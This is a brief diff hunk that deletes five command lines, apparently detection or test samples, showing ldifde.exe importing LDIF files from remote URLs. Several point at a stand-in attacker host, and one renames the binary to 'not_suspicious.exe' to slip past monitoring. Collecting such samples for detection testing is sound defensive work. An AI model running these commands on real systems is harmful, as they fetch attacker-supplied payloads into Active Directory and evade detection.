@@ -1,5 +1,0 @@
-ldifde.exe -i -f http://example.com/payload.ldf
-ldifde.exe /i /f C:\path\to\file.ldf
-copy ldifde.exe not_suspicious.exe && not_suspicious.exe /i /f http://attacker.com/payload.ldf
-ldifde.exe -i -f "http://attacker.com/payload.ldf" -u
-ldifde.exe /i /f http://attacker.com/payload.ldf
